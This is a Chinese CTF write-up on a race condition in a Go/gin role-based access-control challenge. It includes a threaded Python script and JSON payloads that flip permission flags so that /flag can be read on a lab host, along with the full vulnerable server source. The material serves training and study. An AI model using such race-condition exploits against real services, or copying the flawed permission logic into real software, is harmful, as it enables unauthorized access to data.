## 文件上传

[CTF | 天下武功唯快不破之条件竞争漏洞 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/275557.html)



## RBAC

题目中需要rbac:change_return为1时设置file:return，flag:return都为1才能读取

由于go的执行顺序当rbac:change_return为1时只可设置file:return为1吗，而flag:return没法在rbac:change_return为1和rbac:change_return为0的中间，导致无法设置为1，所以无法读取到文件

```
RBACToGrant["rbac:change_return:1"] = 1
RBACToGrant["file:"+value] = 1
RBACToGrant["rbac:change_return:0"] = 1
maxDeep += 3
```

而此处rbac:change_return为1和rbac:change_return为0时有明显的时间距离，所以才想到条件竞争使file:return，flag:return都为1即可

解题脚本

```
import requests
import threading

url = "http://192.168.52.136:8080/execSysFunc"  # 替换成你的目标地址
json_data = {
    "Flag": ["read", "return"],
    "File": ["return", "read"],
    "Directory": [""],
    "Pwd": ["return"],
    "FuncName": "getFile",
    "Param": "/flag"
}

def send_request(index):
    try:
        response = requests.post(url, json=json_data)
        print(f"[Thread {index}] Status Code: {response.text}")
    except Exception as e:
        print(f"[Thread {index}] Error: {e}")

threads = []
for i in range(20):  # 并发数
    t = threading.Thread(target=send_request, args=(i,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

```

PS:

也可根据逻辑漏洞，在updateRBAC(RBACToGrant)执行之后而initRBAC()之前执行一次使err不为nil，即可不执行initRBAC()，致使需要的内容都为1（此处也有一定概率，需要保持执行顺序如下才能正常）

![image-20250723175120122](条件竞争.assets\image-20250723175120122.png)

需要的结果如下

```
map[directory:read:0 directory:return:0 file:read:1 file:return:1 flag:read:1 flag:return:1 pwd:read:0 rbac:change_read:1 rbac:change_return:1 rbac:read:1]
```

```
{
"Flag": ["return","read"],
  "File": ["return","read"],
  "Directory": [""],
  "Pwd": [""],
  "FuncName": "getFile1",
  "Param": "/flag"
}

```

然后把"File"的return删掉在正常读即可（由于go的map读为随机顺序，需要不能让rbac:change_return为0，所以最好不要让"File"有return）

```
{
"Flag": ["return","read"],
  "File": ["read"],
  "Directory": [""],
  "Pwd": [""],
  "FuncName": "getFile",
  "Param": "/flag"
}

```



源码：

```go
package main

import (
        "errors"
        "os"
        "path/filepath"
        "strings"

        "github.com/gin-gonic/gin"
)

var RBACList = make(map[string]int)

type ResTemplate struct {
        Success bool
        Data    any
}

type ExecStruct struct {
        File      []string
        Directory []string
        Pwd       []string
        Flag      []string
        FuncName  string
        Param     string
}

func main() {
        r := gin.Default()
        initRBAC()
        r.GET("/", func(c *gin.Context) {
                htmlContent, err := os.ReadFile("index.html")
                if err != nil {
                        c.String(400, "Error loading HTML file")
                        return
                }

                c.Writer.Write(htmlContent)
        })

        r.GET("/getCurrentRBAC", func(c *gin.Context) {
                var response ResTemplate
                if RBACList["rbac:read"] == 1 {
                        response = ResTemplate{
                                Success: true,
                                Data:    RBACList,
                        }
                        c.JSON(200, response)
                } else {
                        response = ResTemplate{
                                Success: false,
                        }
                        c.JSON(403, response)

                }

        })

        r.POST("/execSysFunc", func(c *gin.Context) {
                var execStruct ExecStruct
                var response ResTemplate
                err := c.ShouldBindJSON(&execStruct)
                if err != nil {
                        response = ResTemplate{
                                Success: false,
                                Data:    map[string]string{"error": err.Error()},
                        }
                        c.JSON(400, response)
                }

                // permission grant
                RBACToGrant := make(map[string]int)
                var value string
                maxDeep := 0

                if execStruct.Directory != nil {
                        for _, value = range execStruct.Directory {
                                if maxDeep < 8 {
                                        RBACToGrant["directory:"+value] = 1
                                        maxDeep++
                                } else {
                                        break
                                }

                        }
                }
                if execStruct.Flag != nil {
                        for _, value = range execStruct.Flag {
                                if maxDeep < 8 {
                                        RBACToGrant["flag:"+value] = 1
                                        maxDeep++
                                } else {
                                        break
                                }
                        }
                }
                if execStruct.Pwd != nil {
                        for _, value = range execStruct.Pwd {
                                if maxDeep < 8 {
                                        RBACToGrant["pwd:"+value] = 1
                                        maxDeep++
                                } else {
                                        break
                                }

                        }
                }

                if execStruct.File != nil {

                        for _, value = range execStruct.File {
                                // Grant temporary file:return permissions
                                if value == "return" && RBACList["rbac:change_return"] != 1 {
                                        if maxDeep < 5 {
                                                RBACToGrant["rbac:change_return:1"] = 1
                                                RBACToGrant["file:"+value] = 1
                                                RBACToGrant["rbac:change_return:0"] = 1
                                                maxDeep += 3
                                        } else {
                                                break
                                        }

                                } else {
                                        if maxDeep < 8 {
                                                RBACToGrant["file:"+value] = 1
                                                maxDeep++
                                        } else {
                                                break
                                        }

                                }

                        }
                }
                updateRBAC(RBACToGrant)
                result, err := execCommand(execStruct.FuncName, execStruct.Param)
                if err != nil {
                        response = ResTemplate{
                                Success: false,
                                Data:    map[string]string{"error": err.Error()},
                        }
                        c.JSON(400, response)

                } else {
                        response = ResTemplate{
                                Success: true,
                                Data:    map[string]string{"result": result},
                        }
                        initRBAC()
                        c.JSON(200, response)
                }

        })
        r.Run(":80")
}

func initRBAC() {
        RBACList = make(map[string]int)
        RBACList["file:read"] = 0
        RBACList["file:return"] = 0
        RBACList["flag:read"] = 0
        RBACList["flag:return"] = 0
        RBACList["pwd:read"] = 0
        RBACList["directory:read"] = 0
        RBACList["directory:return"] = 0
        RBACList["rbac:read"] = 1
        RBACList["rbac:change_read"] = 1
        RBACList["rbac:change_return"] = 0

}

func updateRBAC(RBACToGrant map[string]int) {
        for key, value := range RBACToGrant {
                if strings.HasSuffix(key, ":read") {
                        if RBACList["rbac:change_read"] == 1 {
                                RBACList[key] = value
                        }
                } else if strings.HasSuffix(key, ":return") {
                        if RBACList["rbac:change_return"] == 1 {
                                RBACList[key] = value
                        }
                } else if key == "rbac:change_return:1" {
                        RBACList["rbac:change_return"] = 1

                } else if key == "rbac:change_return:0" {
                        RBACList["rbac:change_return"] = 0

                } else {
                        RBACList[key] = value
                }

        }
}

func execCommand(funcName string, param string) (string, error) {

        if funcName == "getPwd" {
                if RBACList["pwd:read"] == 1 {
                        pwd, err := os.Getwd()
                        return pwd, err

                } else {
                        return "No Permission", nil
                }
        } else if funcName == "getDirectory" {
                // read directory
                if RBACList["directory:read"] == 1 {
                        var fileNames []string
                        err := filepath.Walk(param, func(path string, info os.FileInfo, err error) error {
                                fileNames = append(fileNames, info.Name())
                                return nil
                        })
                        if err != nil {
                                return "error", err
                        }
                        directoryFiles := strings.Join(fileNames, " ")
                        if RBACList["directory:return"] == 1 {
                                return directoryFiles, nil
                        } else {
                                return "the directory " + param + " exists", nil
                        }

                } else {
                        return "No Permission", nil
                }

        } else if funcName == "getFile" {
                // read file
                if RBACList["file:read"] == 1 {
                        if strings.Contains(param, "flag") {
                                if RBACList["flag:read"] != 1 {
                                        return "No Permission", nil
                                }

                        }
                        data, err := os.ReadFile(param)
                        if err != nil {
                                return "file:"+param+" doesn't exist", nil
                        }
                        content := string(data)
                        if RBACList["file:return"] == 0 {
                                return "the file " + param + " exists", nil
                        } else if RBACList["file:return"] == 1 && !strings.Contains(param, "flag") {
                                return content, nil
                        } else if RBACList["file:return"] == 1 && strings.Contains(param, "flag") && RBACList["flag:return"] == 1 {
                                return content, nil
                        } else {
                                return "the file " + param + " exists", nil
                        }

                } else {
                        return "No Permission", nil
                }
        } else {
                return "No such func", errors.New("No such func")
        }
}
```

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>A RBAC based func executor</title>
    <style>
        .field {
            margin-bottom: 10px;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input[type="checkbox"],
        input[type="text"],
        select {
            width: 100%;
            padding: 5px;
            border: 1px solid #ccc;
            border-radius: 3px;
        }

        input[type="checkbox"] {
            display: inline-block;
            width: auto;
            margin-right: 5px;
        }

        label[for="file-read"],
        label[for="file-return"],
        label[for="directory-read"],
        label[for="directory-return"],
        label[for="pwd-read"],
        label[for="pwd-return"],
        label[for="flag-read"],
        label[for="flag-return"] {
            display: inline;
        }

        button[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        button[type="submit"]:hover {
            background-color: #0056b3;
        }

        #response-result {
            margin-top: 10px;
            padding: 10px;
            background-color: #f0f0f0;
            border-radius: 5px;
        }
    </style>
</head>
<body>
<form id="exec-struct-form">
    <h2>ExecStruct Form</h2>
    <div class="field">
        <label for="file">File:</label>
        <input type="checkbox" id="file-read" name="file" value="read">
        <label for="file-read">Read</label>
        <input type="checkbox" id="file-return" name="file" value="return">
        <label for="file-return">Return</label>
    </div>
    <div class="field">
        <label for="directory">Directory:</label>
        <input type="checkbox" id="directory-read" name="directory" value="read">
        <label for="directory-read">Read</label>
        <input type="checkbox" id="directory-return" name="directory" value="return">
        <label for="directory-return">Return</label>
    </div>
    <div class="field">
        <label for="pwd">Pwd:</label>
        <input type="checkbox" id="pwd-read" name="pwd" value="read">
        <label for="pwd-read">Read</label>
        <input type="checkbox" id="pwd-return" name="pwd" value="return">
        <label for="pwd-return">Return</label>
    </div>
    <div class="field">
        <label for="flag">Flag:</label>
        <input type="checkbox" id="flag-read" name="flag" value="read">
        <label for="flag-read">Read</label>
        <input type="checkbox" id="flag-return" name="flag" value="return">
        <label for="flag-return">Return</label>
    </div>
    <div class="field">
        <label for="func-name">FuncName:</label>
        <select id="func-name" name="func-name">
            <option value="getDirectory">getDirectory</option>
            <option value="getPwd">getPwd</option>
            <option value="getFile">getFile</option>
        </select>
    </div>
    <div class="field">
        <label for="param">Param:</label>
        <input type="text" id="param" name="param">
    </div>
    <button type="submit">Submit</button>
</form>
<div id="response-result"></div>
<script>
    document.getElementById('exec-struct-form').addEventListener('submit', function(event) {
        event.preventDefault();


        var file = [];
        document.querySelectorAll('input[name="file"]:checked').forEach(function(checkbox) {
            file.push(checkbox.value);
        });


        var directory = [];
        document.querySelectorAll('input[name="directory"]:checked').forEach(function(checkbox) {
            directory.push(checkbox.value);
        });


        var pwd = [];
        document.querySelectorAll('input[name="pwd"]:checked').forEach(function(checkbox) {
            pwd.push(checkbox.value);
        });


        var flag = [];
        document.querySelectorAll('input[name="flag"]:checked').forEach(function(checkbox) {
            flag.push(checkbox.value);
        });
        var funcName = document.getElementById('func-name').value;
        var param = document.getElementById('param').value;


        var data = {
            File: file,
            Directory: directory,
            Pwd: pwd,
            Flag: flag,
            FuncName: funcName,
            Param: param
        };


        fetch('/execSysFunc', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        }).then(function(response) {
            return response.json();
        }).then(function(data) {

            if (data.Success) {
                document.getElementById('response-result').textContent = data.Data.result;
            } else {
                document.getElementById('response-result').textContent = 'Error: ' + data.Data.result;
            }
        }).catch(function(error) {

            document.getElementById('response-result').textContent = 'Error: ' + error.message;
        });
    });
</script>
</body>
</html>
```

#### 2018HCTF&admin

[一题三解之2018HCTF&admin-安全KER - 安全资讯平台](https://www.anquanke.com/post/id/164086#h2-0)
